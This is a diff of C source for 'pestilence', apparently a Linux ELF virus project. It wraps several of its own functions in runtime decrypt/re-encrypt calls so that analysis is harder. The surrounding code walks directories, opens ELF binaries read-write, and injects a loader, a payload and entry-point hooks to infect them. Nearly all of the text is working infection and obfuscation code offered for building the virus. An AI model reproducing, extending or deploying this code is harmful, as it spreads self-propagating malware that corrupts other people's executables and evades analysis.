@@ -1,24 +1,14 @@
 #include "pestilence.h"
 
-static void	init_info(t_info *info)
+static void	init_info(t_info *info, size_t *tab_addr)
 {
 	info->text_begin = 0;
 	info->text_size = 0;
 	info->valid_target = 1;
 	info->in_pestilence = 0;
 
-	info->tab_addr[0] = (size_t)&update_index;
-	info->tab_addr[1] = (size_t)&check_magic;
-	info->tab_addr[2] = (size_t)&get_padding_size;
-	info->tab_addr[3] = (size_t)&valid_call;
-	info->tab_addr[4] = (size_t)&patch_sections_header;
-	info->tab_addr[5] = (size_t)&find_text;
-	info->tab_addr[6] = (size_t)&hook_call;
-	info->tab_addr[7] = (size_t)&patch_close_entries;
-	info->tab_addr[8] = (size_t)&epo_parsing;
-	info->tab_addr[9] = (size_t)&pe_parsing;
-	info->tab_addr[10] = (size_t)&parse_process;
-	info->tab_addr[11] = (size_t)&check_process;
+	info->tab_addr = tab_addr;
+
 }
 
 
@@ -94,7 +84,7 @@ static int		inject_sign(t_info *info, t_fingerprint *fingerprint)
    }
    */
 
-static void	infect_file(char *path, t_fingerprint *fingerprint)
+static void	infect_file(char *path, t_fingerprint *fingerprint, size_t *tab_addr)
 {
 	struct stat		st;
 	t_info			info;
@@ -103,7 +93,7 @@ static void	infect_file(char *path, t_fingerprint *fingerprint)
 	
 	if ((info.fd = ft_sysopen(path, O_RDWR)) < 0)
 		return ;
-	init_info(&info);
+	init_info(&info, tab_addr);
 	info.in_pestilence = 1;
 	ft_sysfstat(info.fd, &st);
 	info.file_size = st.st_size;
@@ -113,17 +103,25 @@ static void	infect_file(char *path, t_fingerprint *fingerprint)
 		goto end_close;
 	if ((magic = *((uint32_t *)(info.file))) != 0x464C457F)
 		goto end_fct;
-	if (pe_parsing(&info) == 1)
+	uint32_t key = decrypt_func(&info, &pe_parsing, info.tab_addr[10] - info.tab_addr[9], 9);
+	int ret = pe_parsing(&info);
+	reencrypt_func(&info, &pe_parsing, info.tab_addr[10] - info.tab_addr[9], key);
+	if (ret == 1)
 		goto end_fct;
 	if (reload_mapping(&info) == 1)
 		goto end_fct;
-	if (find_text(&info, fingerprint) == 1)
+	key =  decrypt_func(&info, &find_text, info.tab_addr[6] - info.tab_addr[5], 5);
+	ret = find_text(&info, fingerprint);
+	reencrypt_func(&info, &find_text, info.tab_addr[6] - info.tab_addr[5], key);
+	if (ret == 1)
 		goto end_fct;
 	inject_loader(&info);
 	// nice_with_gdb(&info);
 	inject_payload(&info);
 	inject_bis(&info);
+	key = decrypt_func(&info, &epo_parsing, info.tab_addr[9] - info.tab_addr[8], 8);
 	epo_parsing(&info);
+	reencrypt_func(&info, &epo_parsing, info.tab_addr[9] - info.tab_addr[8], key);
 	if (info.valid_target == 0)
 		goto end_fct;
 	patch_addresses(&info);
@@ -190,7 +188,7 @@ end_close:
 	return index;
 }
 
-static int	file_path(char *path, t_fingerprint *fingerprint, char choice)
+static int	file_path(char *path, t_fingerprint *fingerprint, char choice, size_t *tab_addr)
 {
 	char			buf_d[1024];
 	struct linux_dirent64	*dir;
@@ -221,7 +219,7 @@ static int	file_path(char *path, t_fingerprint *fingerprint, char choice)
 				{	//infect dir
 					ft_memcpy(buf_path_file, path, PATH_MAX);
 					ft_strcat(buf_path_file, dir->d_name);
-					infect_file(buf_path_file, fingerprint);
+					infect_file(buf_path_file, fingerprint, tab_addr);
 					fingerprint->fingerprint -= 1;
 				}
 			}
@@ -262,8 +260,25 @@ static void	close_entries(void)
 	ft_memcpy(addr_hook, &addr_origin, 4);
 }
 
+void		fill_tab_addr(size_t *tab_addr)
+{
+	tab_addr[0] = (size_t)&update_index;
+	tab_addr[1] = (size_t)&check_magic;
+	tab_addr[2] = (size_t)&get_padding_size;
+	tab_addr[3] = (size_t)&valid_call;
+	tab_addr[4] = (size_t)&patch_sections_header;
+	tab_addr[5] = (size_t)&find_text;
+	tab_addr[6] = (size_t)&hook_call;
+	tab_addr[7] = (size_t)&patch_close_entries;
+	tab_addr[8] = (size_t)&epo_parsing;
+	tab_addr[9] = (size_t)&pe_parsing;
+	tab_addr[10] = (size_t)&parse_process;
+	tab_addr[11] = (size_t)&check_process;
+}
+
 int		main(void)
 {
+	size_t			tab_addr[12];
 	char			buf[BUF_SIZE];
 	char			buf_path[PATH_MAX];
 	uint32_t		tmp_index;
@@ -279,16 +294,17 @@ int		main(void)
 	ft_syswrite(1, buf, 8);
 	write_test2(buf_path);
 	fingerprint.fingerprint = 0;
-	tmp_index = file_path(buf_path, &fingerprint, 1);
+	fill_tab_addr(tab_addr);
+	tmp_index = file_path(buf_path, &fingerprint, 1, tab_addr);
 	write_test(buf_path);
-	fingerprint.index = file_path(buf_path, &fingerprint, 1);
+	fingerprint.index = file_path(buf_path, &fingerprint, 1, tab_addr);
 	if (tmp_index > fingerprint.index)
 		fingerprint.index = tmp_index;
 	update_own_index(&fingerprint); // update fingerprint.index and update own exec
 	fingerprint.index += fingerprint.fingerprint;
 	fingerprint.fingerprint = fingerprint.index;
-	file_path(buf_path, &fingerprint, 0);
+	file_path(buf_path, &fingerprint, 0, tab_addr);
 	write_test2(buf_path);
-	file_path(buf_path, &fingerprint, 0);
+	file_path(buf_path, &fingerprint, 0, tab_addr);
 	return (0);
 }
